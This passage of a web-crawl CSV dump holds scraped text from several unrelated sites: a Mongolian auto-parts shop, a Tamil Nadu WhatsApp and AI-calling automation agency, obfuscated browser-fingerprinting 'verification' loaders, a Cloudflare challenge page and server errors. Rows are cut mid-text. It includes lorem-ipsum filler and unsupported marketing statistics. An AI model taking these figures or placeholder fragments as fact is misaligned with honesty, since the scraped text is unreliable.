оношилгоо, Тос тосолгоо, Сэлбэгийн худалдаа, Бусад засвар үйлчилгээ хийгдэнэ. Дэлгэрэнгүй Авто сервис Асуудлаа бидэнд даатга Дэлгэрэнгүй Шуурхай Чанартай үйлчилгээ Залгах Sale 30% OFF UX Interior Turning Дэлгүүр ОНЦГОЙ ХЯМДРАЛ Хямдрал дуусахаас өмнө та яараарай. Цаг Минут Секунд Jishee baraaa Амортизатор ₮ 90,000 Add to cart Пүрш Пүрш ₮ 40,000 Add to cart Harrier Амортизатор /хойд/ Амортизатор ₮ 130,000 Add to cart Harrier Амортизатор Амортизатор ₮ 130,000 Add to cart Bongo-Амортизатор Амортизатор ₮ 90,000 Add to cart Alphard-Амортизатор Амортизатор ₮ 120,000 Add to cart Таны машины явах эд ангид асуудал гарсан уу? Morbi accumsan sodales sociosqu curae egestas metus. Tellus nascetur egestas nunc consectetuer ullamcorper sodales dignissim montes ultricies rhoncus etiam. In maximus efficitur dignissim primis semper himenaeos pharetra. Дэлгүүрээр зочлох 0 Brand Product 0 Customer Satisfaction 0 Offline Store 0 Professional Team Худалдаалагдаж буй сэлбэгүүд Quick View Jishee baraaa Амортизатор ₮ 90,000 Add to cart Quick View Пүрш Пүрш ₮ 40,000 Add to cart Quick View Harrier Амортизатор /хойд/ Амортизатор ₮ 130,000 Add to cart Quick View Harrier Амортизатор Амортизатор ₮ 130,000 Add to cart Цааш нь үзэх... (2) ТАНЫ АЯ ТУХ, АЮУЛГҮЙ БАЙДЛЫН ТӨЛӨӨ Манайхаар үйлчлүүлсэн үйлчлүүлэгчдийн маань сэтгэгдэлтэй танилцаарай. Бүх сэтгэгдлүүд Би машиндаа бүтэн сервис хийлгэсэн. Сэтгэл ханамж өндөр байна. Эелдэг шуурхай чанартай үйлчилгээ үзүүлдэг танай хамт олонд баярлалаа. н.Цэрэнбат Үйлчлүүлэгч Би машиндаа бүтэн сервис хийлгэсэн. Сэтгэл ханамж өндөр байна. Эелдэг шуурхай чанартай үйлчилгээ үзүүлдэг танай хамт олонд баярлалаа. Баттөгс Үйлчлүүлэгч Би машиндаа бүтэн сервис хийлгэсэн. Сэтгэл ханамж өндөр байна. Эелдэг шуурхай чанартай үйлчилгээ үзүүлдэг танай хамт олонд баярлалаа. Амарбаяр Үйлчлүүлэгч Яагаад биднийг сонгох хэрэгтэй вэ? Бид танд дараах үйлчилгээнүүдийг санал болгож байна. Олон жилийн туршлагатай инженер техникийн баг хамт олон таны тулгамдсан бүх асуудалд сэтгэл ханамж дүүрэн үйлчилгээг үзүүлж байна. Компьютер оношилгоо Явах эд анги оношилгоо Тэнхлэг тохиргоо Агрегат засвар Тос, тосолгоо Зөвлөгөө, мэдээлэл Жолооч танд түгээмэл тулгардаг асуудлуудад инженерийн зөвлөгөө мэдээллийг хүргэж байна. Зөвлөгөө, мэдээлэл МАШИНЫ ГАЛ ХАМГААЛАГЧИЙН ТАЛААРХ ЗӨВЛӨГӨӨ 3 сар 3, 2024 Зөвлөгөө, мэдээлэл БЕНЗИНТЭЙ МӨРТЛӨӨ АСАХГҮЙ БАЙНА УУ? 3 сар 3, 2024 Зөвлөгөө, мэдээлэл МАШИН ХАЛАХГҮЙ БАЙНА УУ? 3 сар 3, 2024 Баталгаатай нийлүүлэлт Бид захиалгаар орон нутагт баталгаат нийлүүлэлт хийж байна. Төлбөрийн уян хатан нөхцөл Та төлбөрөө бүх банкны карт болон qpay ашиглан хийх боломжтой Чанарын баталгаа Бид сэлбэгтээ баталгаа өгөх ба баталгаат хугацаанд гарсан асуудлыг тань шийдэж өгнө Зөвлөгөө мэдээлэл Та манай лавлах утас болон онлайн туслахаар холбогдон хэрэгтэй зөвлөгөө мэдээллээ авах боломжтой Icon-facebook Icon-twitter1 Icon-instagram-1 Icon-behance Icon-youtube-v Та имэйлээ бүртгүүлээд 5% хямдрал эдлээрэй Email Бүртгүүлэх Бид танд олон жилийн туршлага, чанартай бараа бүтээгдэхүүнээр үйлчилгээ үзүүлдэг Харилцагчийн булан Миний бүртгэл Тусламжийн төв Миний захиалга Хүргэлт, буцаалт Салбаруудын байршил Мэдээлэл Бидний тухай Үйлчилгээний нөхцөл Харилцагчийн үнэлгээ Түгээмэл асуулт хариулт Хямдрал, урамшуулал Холбоо барих БЗД 24-р хороо Эрдэнэтолгой SAFE BUSINESS CENTER өөрийн байр info@bumbum.mn 9101-9101, 7011-0088 Өдөр бүр 09:00-19:00 Copyright © 2023 Сейф трек ХХК-ийн захиалгаар Экстрийм вэб софт ХХК бүтээв. {""prefetch"":[{""source"":""document"",""where"":{""and"":[{""href_matches"":""/*""},{""not"":{""href_matches"":[""/wp-*.php"",""/wp-admin/*"",""/wp-content/uploads/*"",""/wp-content/*"",""/wp-content/plugins/*"",""/wp-content/themes/oceanwp/*"",""/*\\?(.+)""]}},{""not"":{""selector_matches"":""a[rel~=\""nofollow\""]""}},{""not"":{""selector_matches"":"".no-prefetch, .no-prefetch a""}}]},""eagerness"":""conservative""}]} × × Cart Үйлчилгээний нэр Жишээ текст Жишээ текст Жишээ текст Жишээ текст Жишээ текст Жишээ текст ( () => { const lazyloadRunObserver = () => { const lazyloadBackgrounds = document.querySelectorAll( `.e-con.e-parent:not(.e-lazyloaded)` ); const lazyloadBackgroundObserver = new IntersectionObserver( ( entries ) => { entries.forEach( ( entry ) => { if ( entry.isIntersecting ) { let lazyloadBackground = entry.target; if( lazyloadBackground ) { lazyloadBackground.classList.add( 'e-lazyloaded' ); } lazyloadBackgroundObserver.unobserve( entry.target ); } }); }, { rootMargin: '200px 0px 200px 0px' } ); lazyloadBackgrounds.forEach( ( lazyloadBackground ) => { lazyloadBackgroundObserver.observe( lazyloadBackground ); } ); }; const events = [ 'DOMContentLoaded', 'elementor/lazyload/observe', ]; events.forEach( ("
1403,uniksolutions.in,unknown,,False,0,0,0,$,False,False,,none,False,,whatsapp,False,4,False,False,"UNIK Solutions Services Why WhatsApp? Sectors Our Process Free Consultation Technology for Modern Business Growth Smarter Operations. Faster Response. Zero Missed Leads. ""Customer Enquiry வந்த பிறகும் follow-up miss ஆகக்கூடாது. Manual workload குறைஞ்சா தான் business growth வேகமாகும்."" Most growing businesses in Tamil Nadu lose up to 40% of sales due to delayed callbacks and staff overload. We implement custom **WhatsApp workflow bots, automated AI voice calling, and robust CRM/ERP software** that runs your customer response 24/7. Discuss Your Workflow See WhatsApp Demo Zero Jargon. 100% Operations Focused. | Supports English & Business Tamil unik_ops_intelligence_v4.sh Active bots 142 Booked today 38 Saved hours 29h Live Operations Stream: Google Maps Enquiry WhatsApp Bot Welcomed Instant 2s ago Dr. Karthik Dental Clinic Appointment Auto-Booked Success 40s ago +91 94432 ***** Voice IVR Callback Confirmed Done 2m ago Average Response Speed 2.4 seconds Supporting Real Business Operations Across Tamil Nadu Multi-Specialty Hospitals Schools & Engineering Colleges Real Estate Developers Traders & Wholesale Distributors The Hard Operational Truth Why Do Growing Tamil Nadu Businesses Stall? Local clinics, distributors, and real estate offices don't lose because they lack marketing. They lose because their internal operations leak. See if these sound familiar: Missed Callbacks & Delayed Response “Enquiry வருது, ஆனா busy-ஆ இருக்கறதால timely-ஆ call back பண்ண முடியல.” When a potential customer fills a form on your website or Google Maps, they expect a callback. If your team takes 2 hours to call them back, they have already booked your competitor. 60% Leads Lost to delayed callbacks Receptionist & Staff Overload “Staffs-க்கு call handling-லயே time போயிடுது, business operations-ல focus பண்ண முடியல.” Your key employees spend 3 to 4 hours daily repeating basic details over the phone: clinic timing, pricing options, directions, or appointment availability. They have no time left to generate growth. 4+ Hours Daily wasted in repetitive calls Lead Leakage & Loose Operations “Enquiries Notebook-லயோ Excel sheet-லயோ இருக்கு, ஆனா யாரு follow-up பண்ணாங்கன்னு track பண்ண முடியல.” Leads are scattered across notebooks, sticky notes, and individual WhatsApp chats. You have no clear view of sales stages, making it impossible to hold your sales staff accountable. 35% Sales Leakage due to zero accountability இதே problem உங்க business-லயும் இருக்கா? Let's discuss an automation solution → Our Strongest Solution Automate Your Customer Service on WhatsApp ""WhatsApp automation இருந்தா customer enquiry வந்த உடனே instant response possible."" 90% of Tamil Nadu consumers prefer communicating over WhatsApp. Our customized workflow engines answer repetitive enquiries, take bookings, send receipts, and coordinate support on auto-pilot. Bilingual FAQ Handling Instant answers about services, branch locations, directions, and prices in polite English and professional Tamil. One-Tap Appointment Scheduling Synchronizes in real-time with Google Calendar or custom clinic/hospital software to block dates without overlapping. Automated Payment Reminders Send invoice alerts, pending balance reminders, and secure UPI payment links directly on chat. DS Dental Support Bot Online | Auto-Response Type a message... Outbound AI Dialer ID: AI_VOICE_4021 Calling Patient: Anand K. Status: Call Connected (00:18s) AI Speech Output ""Hello Anand, your dental cleaning appointment with Dr. Karthik is scheduled for tomorrow at 5:15 PM. Please press 1 to confirm or press 2 if you need to change it."" Database Action Logs: Call status: Patient pressed 1 (Appointment Confirmed) Google Calendar status: Updated flag to [CONFIRMED] AI Outbound Calling Systems Reduce Team Call Volume by 70% ""Staffs call பண்ணி remind பண்றதுக்கு பதிலா, system-ஆட்டோமேட்டிக்கா call பண்ணி confirm பண்ணும்."" Calling every client or patient manually takes hours. Our automated voice calling system coordinates confirmations, payments, and qualifications. If the customer answers, it instantly logs the status and pushes the clean data straight to your dashboard. Clinic Appointment Confirmations Automatically call patients 24 hours prior. If they press '1' to confirm, your Google Calendar/CRM is immediately updated as confirmed. If '2' to reschedule, it opens a WhatsApp slot choice automatically. Automated Fee & Payment Reminders For colleges and wholesale distributors. The system dials due accounts and provides a polite reminder: 'Your billing amount of Rs. 15,200 is outstanding.' Saves massive manual collections staff follow-up time. Outbound Lead Qualification Instantly dial newly generated real estate or education leads to filter out fake numbers and gauge interest before assigning to your senior sales representatives. Keeps your team focused only on warm buyers. Integrated Solutions Suite Robust Business Systems Built for Real Growth We don't sell pre-packaged software that forces you to change your operations. We build customized software systems that replicate and supercharge your current daily workflows. Enterprise Bespoke ERP & CRM Systems Custom operational software designed to run your specific business workflow. Manage real-time inventory levels, calculate complex distributor margins, auto-generate PDF invoices, and monitor sales pipelines without expensive off-the-shelf license fees. Learn More & Discuss High-Performance Premium Web & Portal Development High-performance, beautifully responsive websites and portals that build instantaneous authority. Optimized for speed, mobile layout responsiveness, and quick WhatsApp/call actions, turning silent visitors into active leads. Learn More & Discuss Lead Engine Hyper-Local SEO & Growth Engines Drive premium high-intent customers in Madurai, Chennai, Coimbatore, and other key cities. We position your clinic, project, or trade business at the top of Google Search and Google Maps, where local customers look when they are ready to buy. Lear"
1405,bloomandsavour.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1417,ueluc.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Loader Please wait while your request is being verified... var a0C=a0e;function a0w(){var U=['display:no','name','prototype','642ukvHVd','apply','appendChil','onreadysta','mimeTypes','11bCpfes','filter','length','action','techange','attachEven','0950635027','__proto__','23569IsiIFD','7fa3b767c4','search','5uFAGCG','a6105c0a61','appVersion','webdriver','cttl','open','languages','getElement','document','(((.+)+)+)','plugins','value','navigator','map','ent','hidden','language','type','1465684UaHUQv','style','forEach','submit','1916RJtJUS','DOMContent','stener','2137112NTjZrI','outerWidth','148149JiCAhu','d49030b349','input','ne;','send','form','1b41b08f12','createElem','9CTfnqR','entries','GET','toString','constructo','addEventLi','1119aBUmXD','6182460PEtBCu','append','1633670NksVoL'];a0w=function(){return U;};return a0w();}(function(D,r){var a0q={D:0x186,r:0x180,w:0x192,e:0x187},a=a0e,w=D();while(!![]){try{var e=parseInt(a(0x178))/0x1+parseInt(a(0x173))/0x2*(-parseInt(a(a0q.D))/0x3)+parseInt(a(0x16f))/0x4*(-parseInt(a(0x19d))/0x5)+parseInt(a(0x18d))/0x6*(parseInt(a(0x19a))/0x7)+-parseInt(a(0x176))/0x8+parseInt(a(a0q.r))/0x9*(parseInt(a(0x189))/0xa)+parseInt(a(a0q.w))/0xb*(parseInt(a(a0q.e))/0xc);if(e===r)break;else w['push'](w['shift']());}catch(V){w['push'](w['shift']());}}}(a0w,0x2fe00));function a0e(D,r){var w=a0w();return a0e=function(e,V){e=e-0x15f;var o=w[e];return o;},a0e(D,r);}var a0V=window[a0C(0x169)],a0o={'webdriverCheck':function(){var a0O={D:0x160},R=a0C;return R(0x160)in window||!!a0V[R(a0O.D)];},'userAgentCheck':function(){return/headless|bytespider/i['test'](a0V['userAgent']);},'appVersionCheck':function(){var a0v={D:0x15f},H=a0C;return/headless/i['test'](a0V[H(a0v.D)]);},'pluginArraySpoofing':function(){var a0f={D:0x18c,r:0x167},F=a0C;let D=PluginArray[F(a0f.D)]===a0V[F(a0f.r)]['__proto__'];if(a0V[F(0x167)]['length']>0x0)D&=Plugin[F(0x18c)]===a0V['plugins'][0x0][F(0x199)];return!D;},'mimeTypeArraySpoofing':function(){var a0B={D:0x199,r:0x191},z=a0C;let D=MimeTypeArray[z(0x18c)]===a0V[z(0x191)][z(a0B.D)];if(a0V[z(a0B.r)]['length']>0x0)D&=MimeType[z(0x18c)]===a0V[z(a0B.r)][0x0][z(0x199)];return!D;},'noLanguage':function(){var a0X={D:0x163},t=a0C;return!a0V[t(0x16d)]||a0V[t(a0X.D)][t(0x194)]===0x0;},'zeroOuterDimensions':function(){var a0T={D:0x177},N=a0C;return window['outerHeigh'+'t']===0x0&&window[N(a0T.D)]===0x0;}},a0E=function(w,e){var a0S={D:0x185,r:0x165,w:0x174,e:0x197,V:0x190},a0p={D:0x183,r:0x19c,w:0x166,e:0x184},i=a0C,V=(function(){var E=!![];return function(J,x){var s=E?function(){var j=a0e;if(x){var k=x[j(0x18e)](J,arguments);return x=null,k;}}:function(){};return E=![],s;};}()),o=V(this,function(){var u=a0e;return o[u(a0p.D)]()[u(a0p.r)](u(a0p.w)+'+$')[u(0x183)]()[u(a0p.e)+'r'](o)['search'](u(0x166)+'+$');});o(),window[i(a0S.D)+'stener']?window[i(a0S.r)][i(a0S.D)+i(0x175)](i(a0S.w)+'Loaded',w,e):window[i(0x165)][i(a0S.e)+'t'](i(a0S.V)+i(0x196),w);};a0E(function(){var a0G={D:0x165,r:0x16b,w:0x17d,e:0x17a,V:0x17f,o:0x16b,E:0x17a,J:0x17f,x:0x17a,s:0x17f,k:0x194,P:0x188,W:0x17e,y:0x198,K:0x188,A:0x161,l:0x171,m:0x183,M:0x170,d:0x18a,Q:0x17b,C:0x18b,q:0x179,O:0x168,g:0x18b,v:0x16e,f:0x18f,B:0x18f,X:0x172};setTimeout(function(){var L=a0e,D=window[L(a0G.D)][L(0x164)+'ById']('f05enexz5l4r'),r=+((+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+[])+(+!+[])+(+!+[]+!![]+[])+(+!+[])),w=window[L(a0G.D)][L(0x17f)+L(a0G.r)](L(a0G.w)),e=window[L(a0G.D)]['createElem'+'ent'](L(a0G.e)),V=window[L(0x165)][L(a0G.V)+'ent'](L(a0G.e)),o=window[L(a0G.D)][L(a0G.V)+L(a0G.o)](L(a0G.E)),E=window['document'][L(a0G.J)+'ent'](L(a0G.x)),J=window[L(0x165)][L(a0G.s)+L(0x16b)](L(0x17a)),x=+((+!+[]+!![]+!![])+(+!+[]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![])),s='wsidchk',k='pdata',P='http%3A%2F%2Fueluc.com',W='/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f',y='failedChecks',K=Object[L(0x181)](a0o)[L(0x16a)](([M,d])=>{try{return d()?M:null;}catch(Q){return null;}})[L(0x193)](M=>M!==null),A=K[L(a0G.k)]>0x0;if(A){var l=new URLSearchParams();l[L(a0G.P)]('id',L(0x19e)+L(a0G.W)+L(a0G.y)+'9e'),l['append']('ts','1787941171'),l[L(a0G.K)](s,r+x),l['append'](k,P),l['append'](L(a0G.A),'0'),K[L(a0G.l)](M=>l[L(0x188)](y,M));var m=new XMLHttpRequest();m[L(0x162)](L(0x182),W+'?'+l[L(a0G.m)]()),m[L(0x17c)](null);}else w['id']='f05enexz5l4r',w[L(a0G.M)]=L(a0G.d)+L(a0G.Q),w['method']='GET',w[L(0x195)]=W,e['id']='zfcnk6em4kim',e['name']=s,e['value']=r+x,e[L(0x16e)]='hidden',o[L(a0G.C)]='id',o['value']=L(0x19b)+'60b54a2be4'+L(a0G.q)+'c7',o[L(0x16e)]='hidden',E[L(a0G.C)]='ts',E[L(a0G.O)]='1787941171',E['type']=L(0x16c),V['id']='zklycdfnxt4i',V[L(a0G.g)]=k,V[L(0x168)]=P,V[L(a0G.v)]=L(0x16c),J['name']='cttl',J[L(a0G.O)]='0',J[L(0x16e)]=L(0x16c),w[L(0x18f)+'d'](e),w[L(a0G.f)+'d'](V),w[L(0x18f)+'d'](o),w['appendChil'+'d'](E),w[L(a0G.f)+'d'](J),D[L(a0G.B)+'d'](w),w[L(a0G.X)]();},0x3e8);},![]);"
1422,colwellbrothers.ie,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1426,kefidata.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1430,ntmtrading.co.za,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Forbidden You don't have permission to access this resource.Server unable to read htaccess file, denying access to be safe Apache Server at ntmtrading.co.za Port 80"
1445,alliancemscinc.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1448,dtfensevilla.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Loader Please wait while your request is being verified... var a0R=a0H;(function(M,m){var a0N={M:0x9d,m:0xa5,r:0xa4,H:0x8d},j=a0H,r=M();while(!![]){try{var H=-parseInt(j(a0N.M))/0x1+parseInt(j(0x89))/0x2*(parseInt(j(a0N.m))/0x3)+parseInt(j(0x7c))/0x4*(parseInt(j(0x7d))/0x5)+-parseInt(j(0x83))/0x6+-parseInt(j(0x7a))/0x7+parseInt(j(a0N.r))/0x8*(-parseInt(j(0xa9))/0x9)+parseInt(j(a0N.H))/0xa;if(H===m)break;else r['push'](r['shift']());}catch(K){r['push'](r['shift']());}}}(a0r,0xd8e25));function a0H(M,m){var r=a0r();return a0H=function(H,K){H=H-0x73;var L=r[H];return L;},a0H(M,m);}var a0K=window[a0R(0x8a)],a0L={'webdriverCheck':function(){var a0n={M:0x86},e=a0R;return e(0x86)in window||!!a0K[e(a0n.M)];},'userAgentCheck':function(){var S=a0R;return/headless|bytespider/i[S(0xa3)](a0K[S(0xab)]);},'appVersionCheck':function(){var l=a0R;return/headless/i[l(0xa3)](a0K[l(0x98)]);},'pluginArraySpoofing':function(){var a0P={M:0x82,m:0x87},U=a0R;let M=PluginArray[U(a0P.M)]===a0K[U(0x87)]['__proto__'];if(a0K[U(a0P.m)][U(0x93)]>0x0)M&=Plugin[U(a0P.M)]===a0K[U(0x87)][0x0]['__proto__'];return!M;},'mimeTypeArraySpoofing':function(){var a0q={M:0x88,m:0x92},T=a0R;let M=MimeTypeArray[T(0x82)]===a0K[T(a0q.M)][T(a0q.m)];if(a0K['mimeTypes']['length']>0x0)M&=MimeType[T(0x82)]===a0K[T(a0q.M)][0x0][T(0x92)];return!M;},'noLanguage':function(){var z=a0R;return!a0K[z(0xa8)]||a0K['languages'][z(0x93)]===0x0;},'zeroOuterDimensions':function(){var F=a0R;return window[F(0x7e)+'t']===0x0&&window[F(0x7b)]===0x0;}},a0v=function(r,H){var a0y={M:0xa6,m:0xac,r:0x73},a0a={M:0x76,m:0xaa,r:0x81},X=a0R,K=(function(){var v=!![];return function(V,o){var a0I={M:0x8b},C=v?function(){var h=a0H;if(o){var G=o[h(a0I.M)](V,arguments);return o=null,G;}}:function(){};return v=![],C;};}()),L=K(this,function(){var u=a0H;return L[u(a0a.M)]()[u(a0a.m)](u(a0a.r)+'+$')[u(0x76)]()[u(0x8e)+'r'](L)[u(0xaa)]('(((.+)+)+)'+'+$');});L(),window[X(0x94)+X(a0y.M)]?window['document'][X(0x94)+X(0xa6)](X(a0y.m)+X(a0y.r),r,H):window['document'][X(0x75)+'t']('onreadysta'+X(0xaf),r);};a0v(function(){var a0k={M:0x84,m:0x84,r:0x9f,H:0x95,K:0xae,L:0x84,v:0x9f,V:0x84,o:0x9f,C:0x8f,G:0x90,x:0x79,J:0x77,f:0x78,w:0x7f,p:0x97,O:0x91,E:0x74,D:0x9a,B:0x8c,Z:0x8c,R:0x80,N:0x9e,n:0x8c,Q:0x91,Y:0xa7,P:0x9b};setTimeout(function(){var s=a0H,M=window[s(a0k.M)][s(0x99)+s(0xa2)]('b85504jgf85h'),m=+((+!+[]+!![]+!![])+(+!+[]+!![]+[])+(+!+[]+!![])+(+!+[]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+[])+(+!+[]+!![])),r=window[s(0x84)][s(0x9f)+'ent'](s(0x9c)),H=window[s(a0k.m)][s(a0k.r)+s(a0k.H)](s(a0k.K)),K=window[s(0x84)][s(a0k.r)+s(0x95)](s(0xae)),L=window[s(a0k.L)][s(a0k.v)+'ent'](s(0xae)),v=window[s(a0k.V)][s(a0k.o)+s(0x95)](s(a0k.K)),V=window[s(0x84)]['createElem'+'ent']('input'),o=+((+!+[]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![]+!![]+!![])+(+!+[]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(+!+[]+!![]+!![])),C='wsidchk',G='pdata',x='http%3A%2F%2Fdtfensevilla.com',J='/z0f76a1d14fd21a8fb5fd0d03e0fdc3d3cedae52f',f='failedChecks',w=Object[s(a0k.C)](a0L)[s(a0k.G)](([D,B])=>{try{return B()?D:null;}catch(Z){return null;}})['filter'](D=>D!==null),p=w['length']>0x0;if(p){var O=new URLSearchParams();O[s(a0k.x)]('id',s(0x85)+s(0xa1)+'0950635027'+'9e'),O[s(a0k.x)]('ts','1787941270'),O['append'](C,m+o),O[s(a0k.x)](G,x),O[s(a0k.x)]('cttl','0'),w[s(a0k.J)](D=>O['append'](f,D));var E=new XMLHttpRequest();E[s(0x96)](s(a0k.f),J+'?'+O[s(0x76)]()),E[s(a0k.w)](null);}else r['id']='b85504jgf85h',r[s(a0k.p)]='display:no'+'ne;',r['method']='GET',r[s(0xad)]=J,H['id']='hhxncbjso5re',H[s(0x80)]=C,H['value']=m+o,H['type']=s(a0k.O),L[s(0x80)]='id',L[s(a0k.E)]=s(a0k.D)+'60b54a2be4'+s(0xa0)+'c7',L[s(a0k.B)]='hidden',v['name']='ts',v[s(a0k.E)]='1787941270',v[s(a0k.B)]='hidden',K['id']='muuxwlbolfgf',K['name']=G,K['value']=x,K[s(a0k.Z)]=s(0x91),V[s(a0k.R)]=s(a0k.N),V[s(a0k.E)]='0',V[s(a0k.n)]=s(a0k.Q),r[s(a0k.Y)+'d'](H),r[s(0xa7)+'d'](K),r['appendChil'+'d'](L),r[s(0xa7)+'d'](v),r[s(a0k.Y)+'d'](V),M[s(0xa7)+'d'](r),r[s(a0k.P)]();},0x3e8);},![]);function a0r(){var t=['a6105c0a61','webdriver','plugins','mimeTypes','4xhqeYI','navigator','apply','type','35478330GhxeKy','constructo','entries','map','hidden','__proto__','length','addEventLi','ent','open','style','appVersion','getElement','7fa3b767c4','submit','form','1075170WpwzEM','cttl','createElem','d49030b349','1b41b08f12','ById','test','104816KmEMKd','1372731cayyGw','stener','appendChil','language','369CokBdN','search','userAgent','DOMContent','action','input','techange','Loaded','value','attachEven','toString','forEach','GET','append','5501118qDdwao','outerWidth','4zzNdBa','223115tlRUJZ','outerHeigh','send','name','(((.+)+)+)','prototype','7326162huTMIL','document'];a0r=function(){return t;};return a0r();}"
1457,longtomstudios.co.uk,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,
1468,daneshandishan.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,upstream connect error or disconnect/reset before headers. retried and the latest reset reason: connection timeout
1471,kumarboxmaker.com,unknown,,False,0,0,0,,False,False,,none,False,,none,False,0,False,False,"Enable JavaScript and cookies to continue (function(){window._cf_chl_opt = {cFPWv: 'b',cH: 'LsQ1KfdEOV0pATidEBBkmOWcKet7bhDvfewQbstEfUM-1787941317-1.2.1.1-O4ylXsuIdzx3NzxO.CAl8V9FbYJRskg_pMt2_T1OXZnFmbveDaeSQ8LVJ6.Mu4jA',cITimeS: '1787941317',cN: 'X5vAv0keexJNRm5c3vhF4N',cRay: 'a32556b0db3f9aed',cTplB: '0',cTplC:0,cTplO:0,cTplV:5,cType: 'interactive',cUPMDTk:""/?__cf_chl_tk=7fyyijWE4reYYZpWx5wBNyDIsLXTIqmo2ArqvsxqaBI-1787941317-1.0.1.1-V0n6DUc83gILPodi4ClhIdvD4hrqo2NkSZXh1wBkSBM"",cvId: '3',cZone: 'kumarboxmaker.com',fa:""/?__cf_chl_f_tk=7fyyijWE4reYYZpWx5wBNyDIsLXTIqmo2ArqvsxqaBI-1787941317-1.0.1.1-V0n6DUc83gILPodi4ClhIdvD4hrqo2NkSZXh1wBkSBM"",md: 'xIDvLreWx15ZxyONVNznB2sTr.fuIvXK1ZWRb.WqKhY-1787941317-1.2.1.1-0lpkY4NloGYnLKBqEHNN.Ue2gHED1lUZAAIMcswRvwnsnUyB47SPljYWSA_siPlRKyMxGevIW562lub1kD9OmXKlV7EGWvn5bqXTXwkMR2K8nLktc5aNsCNCqZ7rqeG00Aw7hD_j93uVhDoGJIjZiGw_8FAV4Du4saY5gm.vNmXM1nqouw0EgS6ttEMrW9qs0SgjFg45LANUUNl5.gkDMyRnEUpDImliDAPruF8Gdj3f4fNxFFF8UoO96jBdhVIO7y4tW6p3E4SRDWZdTk2c_zsHvEOHh.MabYewXu4I6EF.gu3UcmjZYFnAZkZUSjXQ4ONtKBOJmjy2lrsPfgVjsm9PCuCDvgjKJgb73cq14iJW0EyccIpqJ53jqVSxY9dJrjm3KJNpucnHPMzs3vbk733Gi8KaREu4uSb7fHuLzD_kn_aMBxhr9NuEvU9zBTtw.8c5Y1l3iZKzfCdXkGSh_SIz2QkQb3EYIatqEUy2bAvH6nWhOll9uQdVlwQC9ni5NlOPPUlARV6PL5IC9yPH1kx8CVrWEracBAEBwHGWBDI_50diGqI0iQZGlm2gZQblKQOR2R81KNxJAlsutHT_LybEXDK15yr8v21QSthHCh09U3F4MO_FaX02jvBonu37m6CYMMyWLtxeIAv6YbEwtPMGRfYmZ11nq.FZ9GYAU7QEoKaR230P_eXd74iXaDz2cAt1zCNe5c83VRz_.bVR8nme8h25r39uXz0TWdO0WKAb8HowuMdkibDDZGRuunK_BROE542ACfYSqyr21_Ei3nzfpAVoOK4NrZoV2Ckqsml7E0ZA3Jms9Sym1dwhoBsM8j0h.x_NuSJrZ2CkGBl6.kDTlFlg9mFZIfgw4Uu0WgJHuycjy6Ac5lxMk31XciyGjzOt3Jq_sgvEW5Y5tmq0.IG1087GHsnAIgJjrlaeolIsu244Rs6WENqbsov4Eth2mm6JdkJUipe.tlW7ugBsLnlg3hOyWcR6kxoVrcszyqBH86tsS7X3QoKqX09KlC.F7pRU4NtXhYA1SqEzmEdVF8TsRjS9EWsI85xVfG0_UgZ5Anif8ndbbt48mrWnziyzOekIfjKu71JnmGFCjpyg6BgspFFaQ0U5ZnRKxQkKuWN6Lb3xw02CLELxWk4mit4G',mdrd: 'H91961F0TsBtEy9LJeAB0XDPOG0Ddgqp2Sw04jscnHs-1787941317-1.2.1.1-cGBACWLu8w_31UD1cdA_0fWe8PkQV9Qncdu47sR3i1mW3m7rH6ip3B.tQ3FJ.W6taqhC2Fco1qT3rOGLFtbRSKyD2ekLK40q874yqmRrK8O83r14imK_wIaeaVyyqUyjam.rl_y3f9TjOBlsUwTgZs7wIZ0iExa.BJYormYxFMG8UErw24xGv1Msy6.qPuZwG9GdFPQ76iCiF_3chlG4bY_SSmJ6BogSW6G9H93OHNZc6lnPbc09YJZH6NpTx_y25GP3EhgKnT6qwDxs9q5mDliRulqxMZxHsFtKrupI1kUgpUCX5EjUXG6CYJNNmxoxJPVPi4Sgf3ptkJgeLO1oQwkQX3GsDOPiEtfyioreoUA_idvVnwknMvt2Rot9GFEUgqVi_ACsUPoEPoe0asz1fNZzAreHzAGr7V8ER9d1w0g4cdNCheNUzOYtISxtfUCEHd2svb2SqQjcldKkryZ7Rg',};var a = document.createElement('script');a.nonce = 'X5vAv0keexJNRm5c3vhF4N';a.src = '/cdn-cgi/challenge-platform/h/b/orchestrate/chl_page/v1?ray=a32556b0db3f9aed';window._cf_chl_opt.cOgUHash = location.hash === '' && location.href.indexOf('#') !== -1 ? '#' : location.hash;window._cf_chl_opt.cOgUQuery = location.search === '' && location.href.slice(0, location.href.length - window._cf_chl_opt.cOgUHash.length).indexOf('?') !== -1 ? '?' : location.search;if (window.history && window.history.replaceState) {var ogU = location.pathname + window._cf_chl_opt.cOgUQuery + window._cf_chl_opt.cOgUHash;history.replaceState(null, null,""/?__cf_chl_rt_tk=7fyyijWE4reYYZpWx5wBNyDIsLXTIqmo2ArqvsxqaBI-1787941317-1.0.1.1-V0n6DUc83gILPodi4ClhIdvD4hrqo2NkSZXh1wBkSBM""+ window._cf_chl_opt.cOgUHash);a.onload = 